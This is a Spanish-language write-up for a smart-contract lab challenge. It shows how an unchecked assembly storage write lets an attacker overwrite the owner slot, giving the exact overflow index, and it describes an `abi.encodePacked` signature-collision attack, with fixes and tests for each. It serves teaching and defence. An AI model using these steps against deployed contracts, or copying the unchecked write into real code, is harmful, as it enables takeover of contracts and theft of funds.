# C10. Validación de entradas: writeup

Este documento explica cómo resolver el reto del caso C10 y la otra variante que se estudia en el laboratorio. El análisis completo está en la sección 4.10 de la memoria.

## El reto: La Sobreescritura

En Polonio el reto se llama `LaSobreescritura`. En el laboratorio, el contrato equivalente es `BovedaVulnerable` (`src/C10-validacion-entradas/Vulnerable.sol`).

**Escenario.** Un contrato tiene un propietario (`owner`) y una lista de registros que cualquiera puede ampliar con `anotar()` y modificar con `editar(indice, valor)`.

**Objetivo.** Convertirte en el propietario del contrato, aunque no exista ninguna función para cambiarlo. En Polonio, el reto se da por resuelto cuando `owner()` devuelve tu dirección.

## Lo que hay que saber del almacenamiento

El almacenamiento de un contrato es una tabla de 2^256 posiciones de 32 bytes (*slots*). Las variables se colocan por orden de declaración:

| Slot | Contenido |
|---|---|
| 0 | `owner` |
| 1 | `registros.length` (la longitud de la lista) |
| `keccak256(1)` | `registros[0]` |
| `keccak256(1) + 1` | `registros[1]` |
| ... | ... |

Los elementos de una lista dinámica no van detrás de la longitud, sino a partir de una posición calculada con un hash del número de su slot.

## La vulnerabilidad

```solidity
// FALLO: sstore en registros[indice] sin bounds check.
function editar(uint256 indice, uint256 valor) external {
    assembly {
        mstore(0x00, registros.slot)
        let base := keccak256(0x00, 0x20)
        sstore(add(base, indice), valor)
    }
}
```

La función calcula a mano la posición del elemento, `base + indice`, y escribe en ella. En Solidity 0.8, el acceso normal `registros[indice]` comprobaría que el índice existe y revertiría si no. En ensamblador no hay ninguna comprobación, y la suma `add` da la vuelta al pasar de 2^256, como un cuentakilómetros. Con el índice adecuado, la posición resultante puede ser cualquiera, incluido el slot 0.

## Resolución paso a paso

1. **Calcular la posición base de la lista.** La lista está en el slot 1, así que sus elementos empiezan en `base = keccak256(abi.encode(uint256(1)))`:

   ```
   base = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
   ```

2. **Calcular el índice que lleva al slot 0.** Queremos que `base + indice` dé la vuelta y valga exactamente 0, así que `indice = 2^256 - base`:

   ```
   indice = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
          = 35707666377435648211887908874984608119992236509074197713628505308453184860938
   ```

   Puedes comprobarlo con Foundry: `cast keccak $(cast abi-encode 'f(uint256)' 1)` da la base, y en Solidity el índice es `0 - base` dentro de un bloque `unchecked`.

3. **Escribir tu dirección en el slot 0.** El valor que se escribe es un `uint256`, así que hay que pasar tu dirección convertida a número, `uint256(uint160(tuDireccion))`. Llama a:

   ```
   editar(35707666377435648211887908874984608119992236509074197713628505308453184860938,
          <tu dirección como número>)
   ```

   Desde tu propia cuenta, no desde un contrato: Polonio exige que el nuevo propietario sea tu cuenta.
4. **Verificar.** `owner()` devuelve tu dirección.

## Otra variante del caso

**Colisión de hash con `abi.encodePacked`** (`PermisosVulnerable`). Un contrato autoriza administradores con una firma sobre dos listas de direcciones, `admins` y `users`, codificadas con `abi.encodePacked`. Esa codificación pega los elementos uno detrás de otro sin indicar dónde acaba cada lista. El firmante autoriza `admins = [user1]` y `users = [atacante]`. El atacante presenta la misma firma con `admins = [user1, atacante]` y `users = []`. Las dos combinaciones producen exactamente los mismos bytes, el mismo hash y, por tanto, la misma firma válida, y el atacante pasa a ser administrador.

El ataque a Poly Network (agosto de 2021) combinó estos dos ingredientes: el contrato llamaba a la función que indicaba el propio mensaje sin validarla, y el atacante eligió un nombre de función cuyo selector de 4 bytes coincidía con el de la función que fija los guardianes del puente.

## Mitigación

La versión corregida (`src/C10-validacion-entradas/Fixed.sol`) valida el índice y usa el acceso indexado normal de Solidity:

```solidity
function editar(uint256 indice, uint256 valor) external {
    require(indice < registros.length, "fuera de rango");
    registros[indice] = valor;
}
```

Para la colisión, la corrección es codificar con `abi.encode`, que incluye la posición y la longitud de cada lista, de modo que dos combinaciones distintas nunca producen los mismos bytes. También sirve firmar un mensaje estructurado con EIP-712.

Como regla general, cualquier parámetro que llegue de fuera debe validarse contra lo que se espera de él. Si una función recibe direcciones de contratos o funciones a las que llamar, debe limitarlas a una lista de valores permitidos.

## Comprobarlo en el laboratorio

```bash
./forge test --match-contract C10_ValidacionEntradas
./forge test --match-contract C10_ValidacionEntradas --match-test test_Exploit_Vulnerable -vvvv
```

| Variante | Ataque | Mitigación |
|---|---|---|
| Escritura arbitraria | `test_Exploit_Vulnerable` | `test_Fixed_Resiste` |
| Colisión con `abi.encodePacked` | `test_Exploit_HashCollision_Vulnerable` | `test_Fixed_HashCollision_Resiste` |
